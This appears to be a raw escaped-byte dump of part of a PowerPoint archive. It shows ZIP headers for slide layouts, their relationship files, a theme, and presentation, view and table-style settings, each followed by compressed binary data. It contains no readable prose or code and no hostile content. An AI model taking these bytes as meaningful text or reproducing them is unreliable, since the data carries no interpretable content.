xb3s\x94Q\xb3\xf1\xe7\xf7\xf1/\x92$\x8bpPD\xeb\x1cSY\x07\xe1\x98 \t\xf8E\x9a1\xd1Fc\xf7\x89\xc68\x16\x10F{\xdf\x84$+\x06\xd9\x16\x17\xefLC\x1b\xf1\x12\xa6\xae9\x86\xbc\xa3%\x89\r\x8arP\x9ce\x92`cAI\xa5W\x04;\xe3\x18+\x89\x96/9[\xb2S\xae\x1dN\xcaSnd\xb1\n\xd08\x9av\xb3\xd0\x98\xe9)-\xb5`\xef\xb9\xafZ\x11\r7\t\xcf\xd5\x08,\x18\x9b\x91\t\xc5\xaa\xd4\xd7V:\xbc\x91FT+\xa3\x9d6J\x17\xb7\xd8F\xe9\xfc\x16k\xbb\xdd\xc0\xbe\xb6\xa9\xca\xaa\x06\xf7k:^\x9b\xce\xab\x82\xc4\x98\x1b\xde6\xad\x16\xb0`\xc7E\xf4^\x18\xb4\x80\x84T\xfeu~[\x8b:i5\xb2\xb4\xe1\\*N\x1b\xbbzQ\x0b;4\r[r3-\xe2Jmr\x01# "\xaf\xa9\xd0\t\xc9V\xe0\xadp\xd1\x08:y"\xe4RV\x04k\xb9$n\x035\xc6\xc9\xdb\x9a\xffkj%_3g\x9ah\x1a\x9f"\x8e\xb6\xc6L#l\xe1\xd8-a\xbf\xa7\xad\xb3G[\xe7!hK$\x87\x93\xfaid~X#.1L\xb2\x18\xea\xdb\xfd\xcfL\x1a\x88\xac\xe0"\x89\x00\xcd\x8eT\x9dRA\xb28\xcc\x08\xd1\x13u$\xf1\x8cp\xa3D\x04J\xbeQ\'\x0b\reFe\xad\xe9w\x1d\xa7\xed\xc9\xadq=\xdb\xc5\xb1w\xf1\xffy\xcd\xfc\xbd\x9a\xf9\x0fQ\xb3X\xd6%K\x11I\x9az\xf5\x1e\xa7^\xe4IU+\x81\x0bV\x91\xfe\xd9\r\x06\xd3\xa0\xef\xf4\xad\xe0`\x16Z\xbe3\x99[S\x7f\xd6\xb3f\x07\x83`\xd2\xf1\x9c\xee\xcc9\xf8\xd2^\xd61\x92Xf9\x0e\xb3\xd5\x9a\xe3\xc5Zj\x94\\\xf1\x83\xd4\xdf\x0cS\xeb|Y\x13!\xc7\x03\xdb\xf3\xe0\xbe\xf7:\n\x80\xd40`\xd7\x9b\xad\xb2\xef\xf7\'}\xd3\xdd\xeb\x1b}\x1e\xff\xb6o\xe0\xcf{\xb2\xceo;\xee\xfd\xc7i\x9f\xa7u\xd8\xb7\xed3\xed\x85n\xb7\xeb\r,\xcf\r\xe6\x96\x1fN&\xd6\xc0q\xe7V\xaf\xe3\x07A0\t\xfd\xa97\xdd\xb6\x8f\x80\xad0\x05Z\xeb\x06\xb9\xba\xfcv\xf2\xe3\xeb\xd5\xe5\xf7;\x1a\xe4\x8e\x9e\xd0C\xfd\x1aP\xc5\\*W\x18\t\x7f\x83\xd8\xa2\xd4$\xc1\x9b\x04\n7\xd3*\x06o\xa2\xa6\xee;\x13\x15\xa3}c\x8d\x7f\x02\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xefi\xb08\xcf\x02\x00\x00n\x08\x00\x00!\x00\x00\x00ppt/slideLayouts/slideLayout5.xml\xccV\xcdn\xdb0\x0c\xbe\x0f\xd8;\x18\xbe\xbb\xb2\x9d\xdf\x06u\x8a$N\xb6\x01][4\xed\x03\xa8\xb6\x1c{\x95eMR\xbcd\xc3\x80>\xd2\xae\xdbq\x8f\xd2\'\x19%\xdbI\x9beE1\x14h/\x11I\x93\x14\xc9\xef\x93\x94\xa3\xe3UN\xad\x92\x08\x99\x15,\xb0\xbd\x03\xd7\xb6\x08\x8b\x8a8c\x8b\xc0\xbe\xba\x9c9}\xdb\x92\n\xb3\x18\xd3\x82\x91\xc0^\x13i\x1f\x0f\xdf\xbe9\xe2\x03I\xe3\x13\xbc.\x96\xca\x82\x1cL\x0ep`\xa7J\xf1\x01B2JI\x8e\xe5A\xc1\t\x83oI!r\xac@\x15\x0b\x14\x0b\xfc\x05r\xe7\x14\xf9\xae\xdbE9\xce\x98]\xc7\x8b\xa7\xc4\x17I\x92E$,\xa2eN\x98\xaa\x92\x08B\xb1\x82\xfae\x9aq\xd9d\xe3O\xc9\xc6\x05\x91\x90\xc6D?,I\xad9t[\\\x7f\xb2-\xe3$JP={\x08}Gs\x1a[\x0c\xe7`\x18S\xccn\x8cQ\xf2KA\x88\x96X\xf9N\xf09?\x17\xc6\xf7\xb4<\x17V\x16\xeb\xd8:\xc6F\xf5\x87\xda\xcd\xa8\xac4\x02\xda\t_4"\x1e\xac\x12\x91\xeb\x15\x06`\xad\x02\x1bpZ\xeb_\xa4md\xa5\xac\xa82F[k\x94\x9e\xed\xf1\x8d\xd2\xe9\x1eo\xd4l\x80\xeem\xaa\xbb\xaa\x8a\xfb\xbb\x1d\xbfi\xe7}Ac",\x7f\xd3VS\xb0\xe4\'Et#-V@C\xba\xff\xaa\xbf\x8dG\xd5\xb4^yZ\x8f;Q\x02\xd8\xf65\xb0?/\xb1P\x04\x94,\x86B;uh\xe5o\x84m\x81\xf5\x00\xd5j\\\xc4k\xbd\xef5\xacP$\xfd\xc0\xa4\xe9Q5\x82h\x84\xebZ0\xf3\xa0R\xcd\xd5\x9a\x12#\x97\xd4\x83\x84\x16\xa6\x0b8\x0c\x11T\xa3\xad1I.\xea\x96\n\x9a\xc5\xb3\x8cR\xa3hZ\x91\t\x15V\x89i`\xab\x95f\x07\x1e\xa8\x8c\xa9\xca\xd2\xeb\xb8n3\xdc\x8ds\xa5m\xf3\xa0m~\xb4)\xa0\x92\xef\x15\xc6\r\xca,>\xc7\x02_TL1F\xb4m\x1c5h\xfd\x1b\xb3\xd6\x0ef\xad\xe7\xc0,V\x15d)\xa6I\x8dW\xf7e\xf0\xa2\xaf\n\xad\x04.\t=\xf4o^\xd8\x1f\x87=\xb7\xe7\x84\x87\x93\x99\xd3vGSg\xdc\x9et\x9d\xc9a?\x1c\xb5|\xb73q\x0f\xbf7\x17N\x8c\x15QYNf\xd9b)\xc8\xd9R\x99*\x85\x9e\x0f\xd672a\xce\xd5\xbc\x1a\x84\x1a\xf6\x91\xef\xc3\x9d\xe5\xb7t\x01\xca\x94\x01\xbb>\xa4\xcan\xdc\xff\xf0\xa6\xbd\xc3\x9b\xf6s\xf0\x06^\x8f\xd3e\xbe\xef\xb8\xf7^\x86>\xaf\xeb\xb0o\xe83\xee\xce\xbcN\xc7\xef;\xbe\x17N\x9d\xf6l4r\xfa\xae7u\xba\xadv\x18\x86\xa3Y{\xec\x8f7\xf4\x91\xb0\x15a0\xd6\x8a w\xb7?O\x7f\xff\xb8\xbb\xfd\xf5\x08A\x1e\xe1\x84Y\xaagM\x839\xd7\xa1\xb0R\xf1\x11\xf3\xb3\xd2\x0c\t\xdeU\x00nbL\x1c\xde\xf5\x1a\xf7\xad\x8b\xce\xd1\xfcO\x18\xfe\x01\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x96g\xc7\x18\xf0\x00\x00\x00&\x04\x00\x00,\x00\x00\x00ppt/slideMasters/_rels/slideMaster1.xml.rels\xc4\xd3\xcdj\xc4 \x10\x07\xf0{\xa1\xef s\xaf&\xd9\x0f\xca\xb2f/ea\xa1\xa7\xb2}\x00\xd1I"MTtvi\xde\xbe\xd2R\xd8\xc0\x12z(\xe4"8:\xff\xf9!\xb8?|\x0e=\xbbbL\xd6;\t%/\x80\xa1\xd3\xdeX\xd7Jx?\x1f\x9f\x9e\x81%R\xce\xa8\xde;\x940b\x82C\xfd\xf8\xb0\x7f\xc3^QnJ\x9d\r\x89\xe5\x14\x97$tDa\'D\xd2\x1d\x0e*q\x1f\xd0\xe5\x93\xc6\xc7AQ\xde\xc6V\x04\xa5?T\x8b\xa2*\x8a\xad\x88\xb7\x19PO2\xd9\xc9H\x88\'\xb3\x02v\x1e\x03\xfe%\xdb7\x8d\xd5\xf8\xe2\xf5e@GwF\x88\xd4[\x83\xafj\xf4\x17\xca\xb1*\xb6H\x128\xbf\xadO.\xadx\x1e\x01\xe2\xbe\xacZRV\xcd\xc9\xca%e\xe5\x9cl\xfb\x9f2\xca\xbd81}W~\xd6Y\xc6f\xc9\x07\xda\xcc\xc9\xd6K\xca\xd6\xbf21\xf9\xdd\xf5\x17\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00ppt/slideLayouts/_rels/slideLayout1.xml.rels\x8c\xcf\xbd\n\xc20\x10\x07\xf0]\xf0\x1d\xc2\xed&\xad\x83\x884u\x11\xc1\xc1E\xf4\x01\x8e\xe4\xda\x06\xdb$\xe4\xa2\xe8\xdb\x9b\xd1\x82\x83\xe3}\xfd\xfe\\\xb3\x7fM\xa3xRb\x17\xbc\x86ZV \xc8\x9b`\x9d\xef5\xdc\xae\xc7\xd5\x16\x04g\xf4\x16\xc7\xe0I\xc3\x9b\x18\xf6\xedr\xd1\\h\xc4\\\x8exp\x91EQ<k\x18r\x8e;\xa5\xd8\x0c4!\xcb\x10\xc9\x97I\x17\xd2\x84\xb9\x94\xa9W\x11\xcd\x1d{R\xeb\xaa\xda\xa8\xf4m@;3\xc5\xc9jH\'[\x83\xb8\xbe#\xfdc\x87\xaes\x86\x0e\xc1<&\xf2\xf9G\x84\xe2\xd1Y:#gJ\x85\xc5\xd4S\xd6 \xe5w\x7f\xb6T\xcb\x12\x01\xaam\xd4\xec\xdd\xf6\x03\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00ppt/slideLayouts/_rels/slideLayout2.xml.rels\x8c\xcf\xbd\n\xc20\x10\x07\xf0]\xf0\x1d\xc2\xed&\xad\x83\x884u\x11\xc1\xc1E\xf4\x01\x8e\xe4\xda\x06\xdb$\xe4\xa2\xe8\xdb\x9b\xd1\x82\x83\xe3}\xfd\xfe\\\xb3\x7fM\xa3xRb\x17\xbc\x86ZV \xc8\x9b`\x9d\xef5\xdc\xae\xc7\xd5\x16\x04g\xf4\x16\xc7\xe0I\xc3\x9b\x18\xf6\xedr\xd1\\h\xc4\\\x8exp\x91EQ<k\x18r\x8e;\xa5\xd8\x0c4!\xcb\x10\xc9\x97I\x17\xd2\x84\xb9\x94\xa9W\x11\xcd\x1d{R\xeb\xaa\xda\xa8\xf4m@;3\xc5\xc9jH\'[\x83\xb8\xbe#\xfdc\x87\xaes\x86\x0e\xc1<&\xf2\xf9G\x84\xe2\xd1Y:#gJ\x85\xc5\xd4S\xd6 \xe5w\x7f\xb6T\xcb\x12\x01\xaam\xd4\xec\xdd\xf6\x03\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00ppt/slideLayouts/_rels/slideLayout3.xml.rels\x8c\xcf\xbd\n\xc20\x10\x07\xf0]\xf0\x1d\xc2\xed&\xad\x83\x884u\x11\xc1\xc1E\xf4\x01\x8e\xe4\xda\x06\xdb$\xe4\xa2\xe8\xdb\x9b\xd1\x82\x83\xe3}\xfd\xfe\\\xb3\x7fM\xa3xRb\x17\xbc\x86ZV \xc8\x9b`\x9d\xef5\xdc\xae\xc7\xd5\x16\x04g\xf4\x16\xc7\xe0I\xc3\x9b\x18\xf6\xedr\xd1\\h\xc4\\\x8exp\x91EQ<k\x18r\x8e;\xa5\xd8\x0c4!\xcb\x10\xc9\x97I\x17\xd2\x84\xb9\x94\xa9W\x11\xcd\x1d{R\xeb\xaa\xda\xa8\xf4m@;3\xc5\xc9jH\'[\x83\xb8\xbe#\xfdc\x87\xaes\x86\x0e\xc1<&\xf2\xf9G\x84\xe2\xd1Y:#gJ\x85\xc5\xd4S\xd6 \xe5w\x7f\xb6T\xcb\x12\x01\xaam\xd4\xec\xdd\xf6\x03\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00ppt/slideLayouts/_rels/slideLayout4.xml.rels\x8c\xcf\xbd\n\xc20\x10\x07\xf0]\xf0\x1d\xc2\xed&\xad\x83\x884u\x11\xc1\xc1E\xf4\x01\x8e\xe4\xda\x06\xdb$\xe4\xa2\xe8\xdb\x9b\xd1\x82\x83\xe3}\xfd\xfe\\\xb3\x7fM\xa3xRb\x17\xbc\x86ZV \xc8\x9b`\x9d\xef5\xdc\xae\xc7\xd5\x16\x04g\xf4\x16\xc7\xe0I\xc3\x9b\x18\xf6\xedr\xd1\\h\xc4\\\x8exp\x91EQ<k\x18r\x8e;\xa5\xd8\x0c4!\xcb\x10\xc9\x97I\x17\xd2\x84\xb9\x94\xa9W\x11\xcd\x1d{R\xeb\xaa\xda\xa8\xf4m@;3\xc5\xc9jH\'[\x83\xb8\xbe#\xfdc\x87\xaes\x86\x0e\xc1<&\xf2\xf9G\x84\xe2\xd1Y:#gJ\x85\xc5\xd4S\xd6 \xe5w\x7f\xb6T\xcb\x12\x01\xaam\xd4\xec\xdd\xf6\x03\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xd5\xd1\x92\xf1\xbc\x00\x00\x007\x01\x00\x00,\x00\x00\x00ppt/slideLayouts/_rels/slideLayout5.xml.rels\x8c\xcf\xbd\n\xc20\x10\x07\xf0]\xf0\x1d\xc2\xed&\xad\x83\x884u\x11\xc1\xc1E\xf4\x01\x8e\xe4\xda\x06\xdb$\xe4\xa2\xe8\xdb\x9b\xd1\x82\x83\xe3}\xfd\xfe\\\xb3\x7fM\xa3xRb\x17\xbc\x86ZV \xc8\x9b`\x9d\xef5\xdc\xae\xc7\xd5\x16\x04g\xf4\x16\xc7\xe0I\xc3\x9b\x18\xf6\xedr\xd1\\h\xc4\\\x8exp\x91EQ<k\x18r\x8e;\xa5\xd8\x0c4!\xcb\x10\xc9\x97I\x17\xd2\x84\xb9\x94\xa9W\x11\xcd\x1d{R\xeb\xaa\xda\xa8\xf4m@;3\xc5\xc9jH\'[\x83\xb8\xbe#\xfdc\x87\xaes\x86\x0e\xc1<&\xf2\xf9G\x84\xe2\xd1Y:#gJ\x85\xc5\xd4S\xd6 \xe5w\x7f\xb6T\xcb\x12\x01\xaam\xd4\xec\xdd\xf6\x03\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xf9\xcf\t9\xe3\x05\x00\x00\\\x1b\x00\x00\x14\x00\x00\x00ppt/theme/theme1.xml\xecYM\x8f\x137\x18\xbeW\xea\x7f\xb0\xe6\x0e\xf9\xd8$\xec\xae\xc8\xa2M6\x81\x02\x0b\xab\xdd@\xc5\xd1\x99qfL<\xe3\x91\xed\xec\x92[\x05\xc7J\x95\xaa\xd2\xaa\x97J\xbd\xf5P\xb5E\x02\xa9\x17\xfak\xb6\xa5j\xa9\xc4_\xe8k\xcfd2N\x9c\x12XP\x91`\x0f\x1b\xdb\xf3\xbc\xdf\x1fy=\xb9x\xe9^\xcc\xd01\x11\x92\xf2\xa4\xed\xd5\xceW=D\x12\x9f\x074\t\xdb\xde\xadA\xff\xdc\xa6\x87\xa4\xc2I\x80\x19OH\xdb\x9b\x12\xe9]\xda\xf9\xf8\xa3\x8bx[E$&\x08\xe8\x13\xb9\x8d\xdb^\xa4T\xba]\xa9H\x1f\x8e\xb1<\xcfS\x92\xc0\xb3\x11\x171V\xb0\x15a%\x10\xf8\x04\xf8\xc6\xacR\xafV[\x95\x18\xd3\xc4C\t\x8e\x81\xed\xcd\xd1\x88\xfa\x04\r4Kog\xc6\xbc\xc7\xe0_\xa2\xa4>\xf0\x998\xd2\xac\x89Ea\xb0\xc1\xb8\xa6?\xe4Tv\x99@\xc7\x98\xb5=\x90\x13\xf0\x93\x01\xb9\xa7<\xc4\xb0T\xf0\xa0\xedU\xcd\x9fW\xd9\xb9X)\x88\x98ZA[\xa2\xeb\x9b\xbf\x9c.\'\x08\xc6uC\'\xc2aAX\xeb7\xb6.\xec\x15\xfc\r\x80\xa9e\\\xaf\xd7\xeb\xf6j\x05?\x03\xc0\xbe\x0f\x96f\xba\x94\xb1\x8d\xfef\xad3\xe3Y\x02e\xcbe\xde\xddj\xb3\xda\xb0\xf1%\xfe\x1bK\xf8\xadN\xa7\xd3\xdc\xb2\xf0\x06\x94-\x1bK\xf8\xcdj\xab\xb1[\xb7\xf0\x06\x94-\x9b\xcb\xfawv\xbb\xdd\x96\x857\xa0l\xd9Z\xc2\xf7/l\xb5\x1a6\xde\x80"F\x93\xf1\x12Z\xc7\xb3\x88L\x01\x19qv\xc5\t\xdf\x04\xf8\xe6,\x01\xe6\xa8J)\xbb2\xfaD\xad\xca\xb5\x18\xdf\xe5\xa2\x0f\x00\x13\\\xach\x82\xd44%#\xec\x03\xae\x8b\x19\x1d\n\xaa\x05\xe0m\x82KO\xb2#_.\x1diYH\xfa\x82\xa6\xaa\xed]M1T\xc4\x1c\xf2\xe2\xe9O/\x9e>F/\x9e>:\xbd\xff\xe4\xf4\xfe\xaf\xa7\x0f\x1e\x9c\xde\xff\xc5Ax\x05\'a\x99\xf0\xf9\x0f_\xfe\xf3\xddg\xe8\xef\xc7\xdf?\x7f\xf8\xb5\x1b/\xcb\xf8?~\xfe\xfc\xf7\xdf\xber\x03U\x19\xf8\xec\x9bG\x7f>y\xf4\xec\xdb/\xfe\xfa\xf1\xa1\x03\xbe+\xf0\xb0\x0c\x1f\xd0\x98Ht\x83\x9c\xa0C\x1e\x83m\x0e\x01d(^\x8db\x10aZ\xa6\xd8MB\x89\x13\xaci\x1c\xe8\x9e\x8a,\xf4\x8d)f\xd8\x81\xeb\x10\xdb\x83\xb7\x05t\x01\x17\xf0\xf2\xe4\xae\xa5\xf0Q$&*\x0f\xb9\x05\xbc\x16\xc5\x16p\x9fs\xd6\xe1\xc2i\xd35-\xab\xec\x85I\x12\xba\x85\x8bI\x19w\x88\xf1\xb1Kvw!\xbe\xbdI\n\xe9L],\xbb\x11\xb1\xd4<`\x10r\x1c\x92\x84(\xa4\x9f\xf11!\x0e\xb2;\x94Z~\xdd\xa7\xbe\xe0\x92\x8f\x14\xbaCQ\x07S\xa7K\x06the\xd3\x9c\xe8\n\x8d!.S\x97\x82\x10o\xcb7\xfb\xb7Q\x873\x17\xfb=rl#\xa1*0s\xb1$\xccr\xe3e<Q8vj\x8ccVF^\xc7*r)y4\x15\xbe\xe5p\xa9 \xd2!a\x1c\xf5\x02"\xa5\x8b\xe6\xa6\x98Z\xea^\x83\xee\xe1\x0e\xfb>\x9b\xc66R(:v!\xafc\xce\xcb\xc8=>\xeeF8N\x9d:\xd3$*c?\x91cHQ\x8c\x0e\xb8r*\xc1\xed\n\xd1{\x88\x03NV\x86\xfb6%V\xb8_^\xdb\xb7hh\xa94O\x10\xfdd"\xf2\xd6m5\xe1\x98&\x1f:\xf2\xda\x1dyWPgI,\xf6\xe1U\xb8\xc5\xee\xdb\xe5"\xa0\xef~\xf3\xdd\xc3\x93\xe4\x80@\xbe\x7f\xe8\xbd\x1fz\xef\xfb\xd8{W\xd5\xf3\xba\x1dw\xded\xcd\xe8<\x1b\x90\r\xbfx\xe5\xb4<\xa2\x8c\x1d\xa9)#\xd7\xa5i\xcf\x12\x94\x0e\xfaph6\x86\xa8\x18\xce\xd3\x08\x96\xb98\x0b\x17\nl\xd6Hp\xf5)U\xd1Q\x84S\x10S3\x12B\x99\xb3\x0e%J\xb9\x84+\x819v\xf26\xf7J\n\xc6\x9b\xb3\xe6\xec2\x08h\xac\xf6y\x90\x1do\x94/\x89\x05\x1b\xb3\x0b\xcdEt&hC3XW\xd8\xc6\x85\xb3\t\xabe\xc05\xa5\xd5\x8cj\xcb\xd2\n\x93\x9d\xd2\xccG\xeeM\xa8\x06\x84\xf5+\x80Z\xab\x9e\x89\x86\x8c\xc1\x8c\x04\xda\xef\x19\x83YX\xdex\x88d\x84\x03\x92\xc7H\xdb\xbdlH\xcd\xf8m\r\xb7\xe9\x0b\xdf\xfa\xd2\xb64\xdb3H[\'Heq\x8d\x15\xe2f\xd1;K\x94f\x0c\xe6Q\xd2u\xbbP\x8e,\xb1w\xe8\x04\xb4j\xd6\x9b\x1e\xf2q\xda\xf6F0M\xc12N\x81\x9f\xd4\r\x08\xb30i{\xbe\xcaMyi1/\x1a\xecN\xcbZu\xa5\xc1\x96\x88TH\xb5\x87e\x94Q\x99G\xb3w(\xc9\\\xffz\xb3\xa1\xfd\xf0f\x0cpt\xa3\xf5\xb4\xd8\xd8\xac\xfd\x8fZ\x98\x8frh\xc9hD|\xb5\xe2d\xbe\xcd\x9f\xf1\x89"\xe2(\nN\xd0\x90M\xc4!\x06\xbdu\xaa\x82=\x01\x95\xf0\x9darMo\x04T\xa8y\x02;\xbb\xf2\xf3*X|W\x93W\x07fi\x84\xf3\x9e\xa4Ktfa\x067\xebB\x07\xb3+\xa9W\xec\x16t\x7fMSL\xc9\xbf!S\xcai\xfc\x9e\x99\xa23\x17\xc6\xd6\x8d\xc0\\\xaa`\x0c\x10\x18\xe9\x1cm{\\\xa8\x88C\x17J#\xea\xf7\x05\x0c\x0eF\x16\xe8\x85\xa0,\xb4J\x88\xe97\xcfZWr<\xef[\x19\x8f\xac\xc9\x85\x91:\xa4!\x12\x14:\x9d\x8a\x04!\x07*\xb7\xf3%\xccjyW\xcc+#g\x94\xf7\x99B]\x99f\x9fCrL\xd8@WoK\xdb\xef\xa1h\xd6MrG\x18\xdcb\xd0\xec}\xee\x8ca\xa8\x0b\xf5]\x9d|\xb2\xb4y\xd5\xf1`.(\xa3_WX\xa9\xe9\x97\xbe\n\xb6\xce\xa6\xc2+~\xd5f\x1dkI\\\xbd\xb9\xf6Wm\n\x97\x0f\xa4\xffA\xe3\xa6\xc2g\xf3\xf9v\xc0\x0f!\xfa\xa8\x98(\x11$\xe2\xb9l\xf0@\xba\x14\xb3\xd5\x10t\xce\x0e3i\x9a\xd5\xdb\x1d\xa3\xe6!(\xe4\xbe\xc5\xe1\xb3\xe4\xecb\\Zp\xf6\x7f\x8b{}g\xe7+\xcb\xd7\xe5<r\xb8\xba\xb2\\\xa2z<\x9a]d\xccn\xe9\x17(>\xbc\x0b\xb2\xf7\xe0\xa24aJfo\x94\xee\xc1U\xb3;\xfb\xed\x00\xf8d\x12\r\xe9\xce\xbf\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00h$\xd1\xc8\x1d\x02\x00\x00\x03\x05\x00\x00\x11\x00\x00\x00ppt/presProps.xml\xac\x94\xddj\xdb0\x18\x86\xcf\x07\xbb\x87\xe0s\xc5\x92,\xff\xc4\xc4)\x92-\xc3`+ct\x17\xa0\xd9rbf[FR\x9a\x8e\xb1{\x9f\xe28YC\t\x94\x11\x9f|\x12\xfa~\x9e\xf7\xb5\xd0\xfa\xe1\xa5\xef\x16\xcfR\x9bV\r\x99\x87\x96\xd0[\xc8\xa1Ru;l3\xef\xfbS\t\x12oa\xac\x18j\xd1\xa9Af\xde/i\xbc\x87\xcd\xc7\x0f\xeb1\x1d\xb54r\xb0\xc2\xba\xd2\xafz\xe1\x1a\r&\x15\x99\xb7\xb3vL}\xdfT;\xd9\x0b\xb3T\xa3\x1c\xdcY\xa3t/\xac\xdb\xea\xad_kqp\x03\xfa\xce\xc7\x10F~/\xda\xc1\x9b\xeb\xf5{\xeaU\xd3\xb4\x95,T\xb5\xef\x1d\xc0\xa9\x89\x96\xddDbv\xedh\xce\xdd\xc6\xf7t{\xad\xe3\ni\xe3D\x9a\x9d:8q\xc7\xf0(\xb4\x9e\x92\x9cO\xd3\xd9\\\xe8Oy]M\xbbnZ\xba\ty\xa77k\xe1\x12\x8cu\xcb\xc5\xb3\xe82O\xcb\xdas\xe7\xfe\xbf\x841\x95/\xf6\xb3\xb1\xf3j\xb1\xd7m\xe6\xfd\xe69\x8abV\x14 A\t\x06\x84\xb2\x18P\x9e\xe7\x803\x02\x03\x1eP\xc6\x82\xf8\xcfq>"i\'\x8c\xd4\xc7\t\xb3\\D\xde\x08\xee\xdbJ+\xa3\x1a\xbb\xacT?;\xe7\x8f\xea \xf5\xa8\xda\xc9<\x04\xcfrEj\xf4\xf6\xc7\x85\xb8,\xa1\xfbN\xd0\xaf\x86M\x1a\x1c\xef56.\x0b\x86#\x18\x03\x14\'\x04\x10\xce\x19`\xf1*\x011ga\x12D\x9c\x17\t=c\x1f\xdd\xfc"\xebV\xe4Vw\xe6.\xf0\'b4;<\xd1\x9d\xe2\xe4\xaf\x7f\xfe\x917M\x8f\xa3\x9c\xaf\x08\x05\x11\x0cr@\x10\xc1\x80\xad\x9c\x84\xa8@A\x0c\xdd\x14\x8a/\xa6\xd7\xad\xa9\x84\xae?\xf5b+y\xdd\xdaBXqG\r\xb3\xe1o\x1d.\x02Da\x84)p\xb6R@\x02\xbc\x02\xf4xO\x18\xa3I\x18E\x18\x86\x08^\x18e#\xf6\x9d\x9d\x18\x8b\xb1\xbd#\x1e\xc67\x01\xcb"\xe4%\xa5\x05\x80<\xe7\x80\x84\x01\x07\xab$@\x80D\x0c\x07\x8c\xbb\x10\x90\x13`\x98V;\xa1\xed\x93\x16\xd5O\xf7\x10|\x93\rs\x97\xab\xbe`\x86\xff\x83\x89o\xbax}\x13\xae\xdf\xad\xcd_\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x008\xb7\x8b\xd6x\x01\x00\x00@\x03\x00\x00\x11\x00\x00\x00ppt/viewProps.xml\x8cR=o\xc20\x10\xdd+\xf5?X\xdeK\x02\x94\x94F$,U\'\x86J\xd0\xee\x96\xed\x04K\x8em\xd9\x06\x12~}/6_m\x18\xd8|\xf7\xde\xbd\xbbw\xe7\xc5\xb2m$\xdas\xeb\x84V\x05\x1e\x8fR\x8c\xb8\xa2\x9a\tU\x17\xf8{\xf3\xf92\xc7\xc8y\xa2\x18\x91Z\xf1\x02w\xdc\xe1e\xf9\xfc\xb40\xf9^\xf0\xc3\x97E \xa0\\N\n\xbc\xf5\xde\xe4I\xe2\xe8\x967\xc4\x8d\xb4\xe1\n\xb0J\xdb\x86x\x08m\x9d0K\x0e \xdc\xc8d\x92\xa6Y\xd2\x10\xa1\xf0\xa9\xde>R\xaf\xabJP\xfe\xa1\xe9\xae\xe1\xcaG\x11\xcb%\xf10\xbc\xdb\n\xe3\xcej\xe6\x115c\xb9\x03\x99P\xfdg\xa4\x12\xcc\xa9\x9e(\x7f\x82\xc5>\x06\xae\xd7\x96\xb3\x15\xaf<rGX\xd5,\x9b\xa48\xb9\xc56\xda\x04\xe8\xfd5\xcb\x02\x94\x0cu\x9c\x14\x8c_C\xba\x96\xec&\x8aO\xb4\'vM\x89\x84u\x8f\xc30\xae\x0f\xca\x05\xc9]\x8b\xe0J\xb3)F\x0c\xb044\x81l7\xcc&\x97*\x93k+j\xa1P\x0b\xe0t\n\x07\xee\x029\x92N-{Z\xbd\x83\xd1V\xce_\xde\x08\naA\xb0Km\x8f\x18\x19\xed\n<\x99\xcfO\xae#%&\xc7\x17\xbfW\x91^\xfc\xc6]?\xd0_\xefJ{\xee6\xbc\xf5\x83\x05\xdc\xf1\xdc\xdb\xbac\xfa_\xfa\xbe\xebh\xf9L\xb8\xf4\x08\xd7\x19\x8cP[\xc1\xd6\x86P\xf8\xa7\x88B\xf1\x1b\x9c\x19\x04hw~F\x95\xf8\xf9\xcb_\x00\x00\x00\xff\xff\x03\x00PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\xb2\x11\x19\xa6\x87\x01\x00\x00\x07\x03\x00\x00\x13\x00\x00\x00ppt/tableStyles.xml\x8c\x92Qo\xc2 \x10\xc7\xdf\x97\xec;\x10\x9e\xc7Zk\xab\xad\xb1\x1a[\xed\xb6d\xf1as{\xa7\x85V\x12\n\x06\x88\xba,\xfb\xee\x83\xda8\xb7\x07\xb3\x97\xe3\x8e\xfb\xdd\x1d\xfca:?\xb6\x1c\xec\xa9\xd2L\x8a\x14\x0e\xee}\x08\xa8\xa8$a\xa2I\xe1\xdb\xa6@1\x04\xda`A0\x97\x82\xa6\xf0\x83j8\x9f\xdd\xdeL\xf1\xc4\x94\xfc\xd5|p\xfa\xac\r\xb0]\x84\x9e\xe0\x14n\x8d\xd9M<OW[\xdab}/wT\xd8\\-U\x8b\x8d\rU\xe3\x11\x85\x0f\xb6{\xcb\xbd\xc0\xf7G^\x8b\x99\x80\x80\xd0:\x85\x9fQ\x1e\x04Q\x18.\xd0x\xb5\x1a\xa1p\x18\x06(\xf3\xc3\x18\xc5Q\xb6\xcc\x93b9\xc8\x87\x8b/8\xbb\x98m\xcff\xed\x13\xb1\xc5\xc12ZdY0B~\x14\x8fQ\x98\x0f}\x14\'I\x82\x92\xa0\x88\x07\xc5\xd2\x1f\xfa\xe3\xfc\xcb]\xc6\x16\xacqk\xef\xb2\x96\xa0kr\x07\xac\xf7\xa0\x18\xe9Z\x1f\xb6\x92\xd3M\xc9\xbb1\xd5\xe6\xd8!.\xa8\xa50/\xb4\x06\x8c\x1cS\xd82!U\xc7\xebJ5e\xce\x15P)\xb4\xea5\x9d-\x9d\xf5fS\xef\\vB\xad*\xd4\xb1{\xccSh\x8e\x83\x9e\xf95\xc7T\x17nF\x94s8\xadM\xb7\ng\x85,\x18\xe7\xa7R\xb7\xe3\x96\x1eP